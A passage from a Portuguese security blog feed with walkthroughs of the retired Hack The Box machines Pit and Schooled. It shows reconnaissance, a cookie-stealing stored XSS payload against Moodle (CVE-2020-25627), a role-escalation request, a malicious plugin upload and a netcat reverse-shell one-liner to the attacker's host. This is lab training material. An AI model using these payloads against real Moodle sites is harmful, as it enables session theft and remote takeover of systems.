  <li>Após este ponto, consegui me conectar utilizando a chave privada correspondente via SSH com a conta do usuário <code class="language-plaintext highlighter-rouge">root</code>, onde consegui obter a flag final.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh <span class="nt">-i</span> pit root@10.10.10.241
Web console: https://pit.htb:9090/

Last login: Tue Aug 10 14:50:51 2021 from 10.10.10.10
<span class="o">[</span>root@pit ~]# <span class="nb">id</span> <span class="o">&amp;&amp;</span> <span class="nb">hostname
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
pit.htb
<span class="o">[</span>root@pit ~]# <span class="nb">cat </span>root.txt
&lt;redacted&gt;
<span class="o">[</span>root@pit ~]#
</code></pre></div></div>

<p>Espero que tenham gostado!</p>

<p>Vejo vocês no próximo posts :smile:</p>]]></content><author><name>Davi Cruz</name></author><category term="Walkthrough" /><category term="HackTheBox" /><category term="HTB Medium" /><category term="HTB Linux" /><summary type="html"><![CDATA[Olá pessoal! A máquina desta semana será Pit, outra máquina Linux classificada como mediana Hack The Box, criada por polarbearer e GibParadox.]]></summary></entry><entry><title type="html">Walktrough: HTB Schooled</title><link href="https://davicruz.com/walkthrough/2021/09/htb-schooled" rel="alternate" type="text/html" title="Walktrough: HTB Schooled" /><published>2021-09-11T00:00:00-03:00</published><updated>2021-09-11T00:00:00-03:00</updated><id>https://davicruz.com/walkthrough/2021/09/htb-schooled</id><content type="html" xml:base="https://davicruz.com/walkthrough/2021/09/htb-schooled"><![CDATA[<p>Olá pessoal!</p>

<p>A máquina desta semana será <strong>Schooled</strong>, outra máquina Linux classificada como mediana do <a href="https://www.hackthebox.eu/">Hack The Box</a>, criada por <a href="https://app.hackthebox.eu/users/114053">TheCyberGeek</a>.<!--more--></p>

<p class="notice--info">:information_source: <strong>Info</strong>: Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.</p>

<p><img src="https://i.imgur.com/qw8zycI.png" alt="HTB Schooled" class="align-center" /></p>

<p>Para resolver esta máquina, precisei explorar dois CVEs de uma versão vulnerável do Moodle, que foi a parte mais difícil do processo, uma vez que a PoC das vulnerabilidades não funcionaram corretamente e demorei um pouco para entender exatamente os passos necessários e executá-los manualmente para obter o acesso inicial. Após isso, tudo foi bem tranquilo, onde as credenciais do banco de dados foram obtidas e, na sequencia, abusei de instruções super permissivas de <code class="language-plaintext highlighter-rouge">sudo</code>.</p>

<p>Espero que gostem!</p>

<h2 id="enumeração">Enumeração</h2>

<p>Como de costume, iniciei por executar um scan rápido com o <code class="language-plaintext highlighter-rouge">nmap</code> para listar os serviços atualmente publicados.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.234
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-01 14:41 <span class="nt">-03</span>
Nmap scan report <span class="k">for </span>10.10.10.234
Host is up <span class="o">(</span>0.077s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9 <span class="o">(</span>FreeBSD 20200214<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc <span class="o">(</span>RSA<span class="o">)</span>
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.46 <span class="o">((</span>FreeBSD<span class="o">)</span> PHP/7.4.15<span class="o">)</span>
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 <span class="o">(</span>FreeBSD<span class="o">)</span> PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
Service Info: OS: FreeBSD<span class="p">;</span> CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>16.06 seconds
</code></pre></div></div>

<p>Em paralelo, iniciei outro scan, para validar todas as portas TCP abertas, onde encontrei também a porta 33060/TCP, resultando no output final dos seguintes serviços:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-p</span> 80,33060 <span class="nt">-A</span> <span class="nt">-oA</span> Full 10.10.10.234                                                                                     
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-01 14:57 <span class="nt">-03</span>
Nmap scan report <span class="k">for </span>schooled.htb <span class="o">(</span>10.10.10.234<span class="o">)</span>
Host is up <span class="o">(</span>0.077s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.46 <span class="o">((</span>FreeBSD<span class="o">)</span> PHP/7.4.15<span class="o">)</span>
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 <span class="o">(</span>FreeBSD<span class="o">)</span> PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message<span class="s2">"
|     HY000
|   LDAPBindReq:
|     *Parse error unserializing protobuf message"</span>
|     HY000
|   oracle-tns:
|     Invalid message-frame.<span class="s2">"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.91%I=7%D=8/1%Time=6106E084%P=x86_64-pc-linux-gnu%r(NU
SF:LL,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(GenericLines,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>
SF:08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(GetRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(HTTPOpt
SF:ions,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(RTSPRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\</span>
SF:x08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(RPCCheck,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(DNSVersi
SF:onBindReqTCP,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(DNSStatusRequestTCP,2B
SF:,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fIn
SF:valid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%
SF:r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\
SF:x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20message<span class="se">\"\x</span>05HY000<span class="s2">")%r(TerminalServerCookie,
SF:9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(TLSSessionReq,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>0
SF:8<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9,
SF:"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20message<span class="se">\"\x</span>05HY00
SF:0<span class="s2">")%r(FourOhFourRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(LPDString,9
SF:,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(LDAPSearchReq,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08
SF:<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20message\"\x
SF:05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\x
SF:08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\*</span>Parse<span class="se">\x</span>20error<span class="se">\x</span>20unserializing<span class="se">\x</span>20protobuf<span class="se">\x</span>20mes
SF:sage<span class="se">\"\x</span>05HY000<span class="s2">")%r(SIPOptions,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(LAND
SF:esk-RC,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(TerminalServer,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0</span>
SF:<span class="se">\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(NCP,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(NotesRPC
SF:,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0
SF:fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1
SF:a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,"\
SF:x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>16Invalid<span class="se">\</span>
SF:x20message-frame<span class="se">\.\"\x</span>05HY000<span class="s2">")%r(ms-sql-s,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1
SF:a<span class="se">\0</span><span class="s2">")%r(afp,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\</span>
SF:x88<span class="s1">'\x1a\x0fInvalid\x20message\"\x05HY000");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.96 seconds
</span></code></pre></div></div>

<h3 id="80tcp---serviço-http">80/TCP - Serviço HTTP</h3>

<p>Acessando a página inicial, podemos ver um site institucional de uma escola, que também menciona que todo o seu conteúdo é entregue através da plataforma <strong>Moodle</strong>, que eventualmente teremos acesso e precisaremos buscar por ela eventualmente.</p>

<p><img src="https://i.imgur.com/hy0QFcA.png" alt="HTB Schooled - Institutional Page" class="align-center" /></p>

<p>Também, executando o <code class="language-plaintext highlighter-rouge">whatweb</code>, encontrei a conta de e-mail <strong>admissions@schooled.htb</strong> onde o dominicio <code class="language-plaintext highlighter-rouge">schooled.htb</code> deve ser o utilizado pela organização, o qual foi adicionado ao arquivo hosts local.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>whatweb <span class="nt">--color</span><span class="o">=</span>never <span class="nt">-a</span> 3 10.10.10.234
http://10.10.10.234 <span class="o">[</span>200 OK] Apache[2.4.46], Bootstrap[4.1.0], Country[RESERVED][ZZ], Email[#,admissions@schooled.htb], HTML5, HTTPServer[FreeBSD][Apache/2.4.46 <span class="o">(</span>FreeBSD<span class="o">)</span> PHP/7.4.15], IP[10.10.10.234], PHP[7.4.15], Script, Title[Schooled - A new kind of educational institute], X-UA-Compatible[IE<span class="o">=</span>edge]
</code></pre></div></div>

<p>Enquanto deixei o <code class="language-plaintext highlighter-rouge">gobuster dir</code> executando em background para enumerar páginas e eventuais diretórios nessa máquina, uma vez que vi que nada estava sendo retornado, decidi iniciar uma instancia de enumeração de subdomínios, onde os domínios <strong>moodle</strong> e <strong>student</strong> foram encontrados, também adicionados no arquivo hosts local.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster dns <span class="nt">-d</span> schooled.htb <span class="nt">-w</span> /usr/share/dnsrecon/subdomains-top1mil-5000.txt
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Domain:     schooled.htb
<span class="o">[</span>+] Threads:    10
<span class="o">[</span>+] Timeout:    1s
<span class="o">[</span>+] Wordlist:   /usr/share/dnsrecon/subdomains-top1mil-5000.txt
<span class="o">===============================================================</span>
2021/08/01 17:24:31 Starting gobuster <span class="k">in </span>DNS enumeration mode
<span class="o">===============================================================</span>
Found: moodle.schooled.htb
Found: student.schooled.htb

<span class="o">===============================================================</span>
2021/08/01 17:25:04 Finished
<span class="o">===============================================================</span>
</code></pre></div></div>

<p>O subdomínio <code class="language-plaintext highlighter-rouge">student.schooled.htb</code> estava redirecionando para a página principal, porém o subdomínio <code class="language-plaintext highlighter-rouge">moodle.schooled.htb</code> nos redirecionou para a página abaixo, que consiste em um site Moodle que vimos sendo mencionado anteriormente e através do qual poderemos obter algum tipo de acesso se este possuir alguma vulnerabilidade não corrigida.</p>

<p><img src="https://i.imgur.com/Sx32BwP.png" alt="HTB Schooled - Moodle" class="align-center" /></p>

<p>Iniciando a enumeração do site Moodle, utilizei o script <a href="https://github.com/inc0d3/moodlescan">moodlescan</a> que simplifica este processo, onde pude obter a versão em execução da plataforma que é <strong>3.9.0-beta</strong>, segundo output abaixo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 moodlescan.py <span class="nt">-u</span> http://moodle.schooled.htb/moodle

Version 0.8 - May/2021
.............................................................................................................

By Victor Herrera - supported by www.incode.cl

.............................................................................................................

Getting server information http://moodle.schooled.htb/moodle ...

server          : Apache/2.4.46 <span class="o">(</span>FreeBSD<span class="o">)</span> PHP/7.4.15
x-powered-by    : PHP/7.4.15
x-frame-options : sameorigin
last-modified   : Mon, 02 Aug 2021 11:54:53 GMT

Getting moodle version...

Version found via /admin/tool/lp/tests/behat/course_competencies.feature : Moodle v3.9.0-beta

Searching vulnerabilities...


Vulnerabilities found: 0

Scan completed.
</code></pre></div></div>

<p>Validando esta versão, pude notar que existem diversas vulnerabilidades conhecidas porém todas elas requerem privilégios que ainda não temos. Decidi então seguir tentando criar uma conta na plataforma e ver se consigo obter alguma informação interessante, considerando que nada estava aberto para usuários acessando o portal como visitante.</p>

<p>Enquanto criava a conta, notei que existe um requisito de utilizar um e-mail do subdomínio <strong>student.schooled.htb</strong>, previamente enumerado utilizando o <code class="language-plaintext highlighter-rouge">gobuster</code>.</p>

<p>Mesmo havendo o requisito, nenhum tipo de validação foi necessária e, ao navegar no portal, a única turma que consegui fazer o auto-assinalamento foi a turma de Matemática, que continua o seguinte anúncio:</p>

<blockquote>
  <p>Reminder for joining students
by Manuel Phillips - Wednesday, 23 December 2020, 12:01 AM
Number of replies: 0
This is a self enrollment course. For students who wish to attend my lectures be sure that you have your MoodleNet profile set.</p>

  <p>Students who do not set their MoodleNet profiles will be removed from the course before the course is due to start and I will be checking all students who are enrolled on this course.</p>

  <p>Look forward to seeing you all soon.</p>

  <p>Manuel Phillips</p>
</blockquote>

<p>Isso significa que o professor Manuel Philips verificará todos os perfis MoodleNet dos alunos que se inscreveram na matéria e, caso possamos armazenar um XSS neste atributo, poderemos utilizar deste artifício para roubar a sessão do professor a partir dos atributos do cabeçalho da requisição. Com acesso na plataforma, dependendo dos privilégios do professor, podemos buscar por uma oportunidade de RCE.</p>

<h2 id="acesso-inicial">Acesso inicial</h2>

<p>Buscando por <strong>MoodleNet XSS</strong>, encontrei este <a href="https://moodle.org/mod/forum/discuss.php?d=410839">Security Announcement</a> que menciona o <strong>CVE-2020-25627</strong>, corrigido apenas na versão 3..9.2 e afeta as versões 3.9 e 3.9.1, que coincide com nosso cenário.</p>

<p>Buscando por uma prova de conceito (PoC) para este CVE, encontrei o repositório <a href="https://github.com/HoangKien1020/CVE-2020-25627">HoangKien1020/CVE-2020-25627: Stored XSS via moodlenetprofile parameter in user profile (github.com)</a> que contém as instruções para exploração, que foram implementadas e me permitiram obter o cookie da sessão do professor, conforme evidencia abaixo:</p>

<ul>
  <li>Loguei com a conta recentemente criada e modifiquei o MoodleNet profile para o conteúdo abaixo</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="k">new</span> <span class="nx">Image</span><span class="p">;</span><span class="nx">i</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://10.10.10.10/xss.php?</span><span class="dl">"</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<ul>
  <li>Hospedei o arquivo <code class="language-plaintext highlighter-rouge">xss.php</code> mencionado no repositório em uma pasta e iniciei um PHP Webserver com os comandos abaixo e, cerca de 2 minutos depois, comecei a receber as requisições da conta do professor, nos mostrando os cookies utilizados por ele.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>php <span class="nt">-S</span> 0.0.0.0:80 <span class="nt">-t</span> <span class="nb">.</span>
<span class="o">[</span>Mon Aug  9 14:44:05 2021] PHP 7.4.21 Development Server <span class="o">(</span>http://0.0.0.0:80<span class="o">)</span> started
<span class="o">[</span>Mon Aug  9 14:45:28 2021] 10.10.10.234:55102 Accepted
<span class="o">[</span>Mon Aug  9 14:45:28 2021] PHP Notice:  Undefined index: METHOD <span class="k">in</span> /opt/dcruz/htb/schooled-10.10.10.234/exploit/www/xss.php on line 28
<span class="o">[</span>Mon Aug  9 14:45:28 2021] PHP Notice:  Undefined index: REMOTE_HOST <span class="k">in</span> /opt/dcruz/htb/schooled-10.10.10.234/exploit/www/xss.php on line 29
<span class="o">[</span>Mon Aug  9 14:45:28 2021] 10.10.10.234:55102 <span class="o">[</span>200]: GET /xss.php?MoodleSession<span class="o">=</span>d8so1t4rs4vmg8btrgfr2ps6fr
<span class="o">[</span>Mon Aug  9 14:45:28 2021] 10.10.10.234:55102 Closing

</code></pre></div></div>

<p>Agora sabendo quais os parametros da sessão do professor, alterei o valor do cookie no meu navegador e, após atualizar a página, pude observar que a conta agora é listada como a do professor Manuel Philips.</p>

<p><img src="https://i.imgur.com/n3plh19.png" alt="HTB Schooled - Moodle as Manuel Philips" class="align-center" /></p>

<p>Agora que temos acesso a outra conta, necessitamos validar se as permissões possuidas por este usuário são suficientes para dar continuidade na exploração, vindo a obter um RCE.</p>

<p>Pesquisando sobre explorações em Moodle em <a href="https://book.hacktricks.xyz/pentesting/pentesting-web/moodle#rce">Moodle - HackTricks</a>, encontrei qeu é necessário o privilégio de <em>manager</em> para realizar o upload de um plugin, método mais eficiente para obter execução de código via aplicação. Mesmo não tendo esta permissão com o usuário do professor, observado que esta versão em execução <strong>também é vulnerável à</strong> <a href="https://moodle.org/mod/forum/discuss.php?d=407393"><strong>Escalação de privilégio</strong></a>, que poderia nos permitir obter o acesso de manager a partir do curso abusando o processo de inscrição e, se um dos estudantes for um dos <em>site managers</em>, este privilégio poderia ser explorado para a finalidade desejada, que é realizar o upload de um plugin malicioso. O mesmo autor da PoC do outro CVE também possui <a href="https://github.com/HoangKien1020/CVE-2020-14321">um repositório no Github</a> contendo uma PoC que poderia nos auxiliar nesta tarefa.</p>

<p>Mesmo não funcionando adequadamente a PoC em nosso cenário, após entender exatamente os passos necessários, foi possível obter execução de código na máquina, conforme passos abaixo:</p>

<ul>
  <li>
    <p>Primeiro foi necessário identificar qual usuário na plataforma poderia ter o privilégio de manager. Com base nas informações obtidas a partire de reconhecimento do site institucional, <strong>Lianne Carter</strong> é a gerente da escola e provavelmente possui os privilégios dos quais precisamos.</p>
  </li>
  <li>
    <p>Também tomei nota sobre o Profile ID do usuário <strong>Manuel Philips</strong>, que foi obtido ao navegar à sua página no link  <code class="language-plaintext highlighter-rouge">http://moodle.schooled.htb/moodle/user/profile.php?id=24</code>.</p>
  </li>
  <li>
    <p>A exploração iniciou-se por fazer a inscrição da gerente da escola na turma de matemática e, interceptando a requisição utilizando o Burp Suite, enviei a mesma ao Repeater e, além da requisição inicial, fiz uma nova para nos conceder o priviégio de Manager no curso, por atribuir o valor <code class="language-plaintext highlighter-rouge">roleid=1</code> e substituir o ID do usuário pelo identificado previamente, conforme visto no video no repositório.</p>
  </li>
</ul>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/moodle/enrol/manual/ajax.php?mform_showmore_main=0&amp;id=5&amp;action=enrol&amp;enrolid=10&amp;sesskey=KbJYqTapFc&amp;_qf__enrol_manual_enrol_users_form=1&amp;mform_showmore_id_main=0&amp;userlist%5B%5D=24&amp;roletoassign=1&amp;startdate=4&amp;duration=</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">moodle.schooled.htb</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
<span class="na">X-Requested-With</span><span class="p">:</span> <span class="s">XMLHttpRequest</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://moodle.schooled.htb/moodle/user/index.php?id=5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">MoodleSession=jil2s8i0vj0gq3vojfki6e7rtq</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Agora como um Administrador do curso, acessando um perfil de usuário podemos utilizar a função “Log in as”, que nos permitiu acessar a plataforma como o usuário Lianne Carter.</p>

    <p><img src="https://i.imgur.com/zRjimbq.png" alt="HTB Schooled - Impersonating Manager in Moodle" class="align-center" /></p>
  </li>
  <li>
    <p>Agora como Lianne, deveríamos ter privilégios de realizar o upload do plugin diretamente, uma vez que a opção “Site Administration” é exibida à esquerda, porém tais privilégios não são habilitados por padrão. Para tal atividade, precisamos editar a role acessando o menu “Site Administration” &gt; “Users” e, na aba “Permissions”, selecionei “Define Roles”.</p>

    <p><img src="https://i.imgur.com/6XmydvH.png" alt="HTB Schooled - Adjusting Role Definitions" /></p>
  </li>
  <li>
    <p>Selecionei a role <strong>Manager</strong> e, clicando no botão “Edit”, interceptei a requisição e substitui o dado enviado pelo encontrado no repositório, qeu me concederia privilégios totais na aplicação.</p>

    <p><img src="https://i.imgur.com/lm0NOX7.png" alt="HTB Schooled - Modifying Manager role" class="align-center" /></p>

    <p><img src="https://i.imgur.com/5L28UqN.png" alt="HTB Schooled - Appending payload to Edit Request" class="align-center" /></p>
  </li>
  <li>
    <p>Agora, navegando em “Site Administration” &gt; “Plugins” podemos ver a opção para instalação, para o qual o arquivo <code class="language-plaintext highlighter-rouge">rce.zip</code>, também disponibilizado no portal, foi carregado, nos permitindo executar comandos remotamente e obter um shell reverso a partir de chamadas na URL do plugin, conforme abaixo:</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-X</span> GET <span class="nt">-G</span> <span class="s1">'http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php'</span> <span class="nt">--data-urlencode</span> <span class="s1">'cmd=id'</span>
<span class="nv">uid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span>

<span class="nv">$ </span>curl <span class="nt">-X</span> GET <span class="nt">-G</span> <span class="s1">'http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php'</span> <span class="nt">--data-urlencode</span> <span class="s1">'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc "10.10.10.10" 4443 &gt;/tmp/f'</span>
</code></pre></div></div>

<h2 id="user-flag">User Flag</h2>

<p>Agora com um shell interativo com a conta <code class="language-plaintext highlighter-rouge">www-data</code>, iniciei a enumeração da máquina. Como de costume, iniciei com a execução do <code class="language-plaintext highlighter-rouge">linpeas.sh</code> mas descobri que <code class="language-plaintext highlighter-rouge">wget</code> e <code class="language-plaintext highlighter-rouge">curl</code> não estavam disponível, então escrevi um simples script php para baixar os arquivos dos quais precisava.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"&lt;?php"</span> <span class="o">&gt;</span> wget.php
<span class="nb">echo</span> <span class="s2">"</span><span class="se">\$</span><span class="s2">url = 'http://10.10.10.10/linpeas.sh';"</span> <span class="o">&gt;&gt;</span> wget.php
<span class="nb">echo</span> <span class="s2">"</span><span class="se">\$</span><span class="s2">file = '/tmp/linpeas.sh';"</span> <span class="o">&gt;&gt;</span> wget.php
<span class="nb">echo</span> <span class="s2">"</span><span class="se">\$</span><span class="s2">current = file_get_contents(</span><span class="se">\$</span><span class="s2">url);"</span> <span class="o">&gt;&gt;</span> wget.php
<span class="nb">echo</span> <span class="s2">"file_put_contents(</span><span class="se">\$</span><span class="s2">file, </span><span class="se">\$</span><span class="s2">current);"</span> <span class="o">&gt;&gt;</span> wget.php
<span class="nb">echo</span> <span class="s2">"?&gt;"</span> <span class="o">&gt;&gt;</span> wget.php

/usr/local/bin/php wget.php
</code></pre></div></div>

<p>A partir da execução, a seguintes informações foram obtidas:</p>

<ul>
  <li>Usuários com console e suas permissões:</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh
root:*:0:0:Charlie &amp;:/root:/bin/csh
steve:*:1002:1002:User &amp;:/home/steve:/bin/csh
</code></pre></div></div>

<ul>
